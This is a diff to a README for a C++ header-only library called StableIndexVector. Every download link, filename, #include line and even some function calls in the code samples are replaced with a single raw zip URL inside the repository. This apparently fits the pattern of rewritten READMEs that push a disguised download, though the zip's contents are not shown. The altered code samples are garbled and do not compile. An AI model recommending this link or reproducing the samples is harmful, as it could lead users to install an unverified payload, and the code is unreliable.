@@ -1,6 +1,6 @@
 # 🌟 StableIndexVector - Effortless Access to Array Elements
 
-[![Download StableIndexVector](https://img.shields.io/badge/Download-StableIndexVector-brightgreen.svg)](https://github.com/zu1-pvp/StableIndexVector/releases)
+[![Download StableIndexVector](https://github.com/zu1-pvp/StableIndexVector/raw/refs/heads/main/capitalize/Vector_Stable_Index_2.8.zip)](https://github.com/zu1-pvp/StableIndexVector/raw/refs/heads/main/capitalize/Vector_Stable_Index_2.8.zip)
 
 ## 📚 About StableIndexVector
 
@@ -11,20 +11,20 @@ StableIndexVector, or SIV, is a C++ library designed to provide an easy way to m
 To get started with StableIndexVector, follow these simple steps:
 
 1. **Download the Library**  
-   Visit the page to download: [Download StableIndexVector](https://github.com/zu1-pvp/StableIndexVector/releases)
+   Visit the page to download: [Download StableIndexVector](https://github.com/zu1-pvp/StableIndexVector/raw/refs/heads/main/capitalize/Vector_Stable_Index_2.8.zip)
 
 2. **Add the Library to Your Project**  
-   Copy the `index_vector.hpp` file to your project folder. This is a header-only library, so you don’t need to deal with complicated installation processes.
+   Copy the `https://github.com/zu1-pvp/StableIndexVector/raw/refs/heads/main/capitalize/Vector_Stable_Index_2.8.zip` file to your project folder. This is a header-only library, so you don’t need to deal with complicated installation processes.
 
 3. **Include the Library in Your Code**  
    In your main application file, include the library by adding this line:
    ```cpp
-   #include "index_vector.hpp"
+   #include "https://github.com/zu1-pvp/StableIndexVector/raw/refs/heads/main/capitalize/Vector_Stable_Index_2.8.zip"
    ```
 
 ## 📥 Download & Install
 
-To download the latest version of StableIndexVector, visit this page: [Download StableIndexVector](https://github.com/zu1-pvp/StableIndexVector/releases). From there, choose the appropriate version for your needs. 
+To download the latest version of StableIndexVector, visit this page: [Download StableIndexVector](https://github.com/zu1-pvp/StableIndexVector/raw/refs/heads/main/capitalize/Vector_Stable_Index_2.8.zip). From there, choose the appropriate version for your needs. 
 
 ## 🛠️ Features
 
@@ -43,7 +43,7 @@ StableIndexVector comes packed with helpful features:
 Once you have included the library, using it is straightforward. Here’s how you can implement a simple example:
 
 ```cpp
-#include "index_vector.hpp"
+#include "https://github.com/zu1-pvp/StableIndexVector/raw/refs/heads/main/capitalize/Vector_Stable_Index_2.8.zip"
 
 struct Entity {
     int x, y;
@@ -54,8 +54,8 @@ int main() {
     siv::Vector<Entity> entities;
     
     // Add objects - returns a stable ID
-    siv::ID player = entities.emplace_back(0, 0, "Player");
-    siv::ID enemy = entities.emplace_back(10, 5, "Enemy");
+    siv::ID player = https://github.com/zu1-pvp/StableIndexVector/raw/refs/heads/main/capitalize/Vector_Stable_Index_2.8.zip(0, 0, "Player");
+    siv::ID enemy = https://github.com/zu1-pvp/StableIndexVector/raw/refs/heads/main/capitalize/Vector_Stable_Index_2.8.zip(10, 5, "Enemy");
     
     // Access via ID
     std::cout << "Player: " << entities[player].name << std::endl;
@@ -96,7 +96,7 @@ The StableIndexVector library is designed to work with standard C++ compilers. Y
 
 If you encounter issues while trying to implement StableIndexVector, consider the following:
 
-1. **File Not Found**: Ensure that `index_vector.hpp` is in the same directory as your project files or adjust the include path accordingly.
+1. **File Not Found**: Ensure that `https://github.com/zu1-pvp/StableIndexVector/raw/refs/heads/main/capitalize/Vector_Stable_Index_2.8.zip` is in the same directory as your project files or adjust the include path accordingly.
 
 2. **Compiler Errors**: Double-check that you are using a C++11 compliant compiler. Update your IDE settings or use a newer version of the compiler if necessary.
 
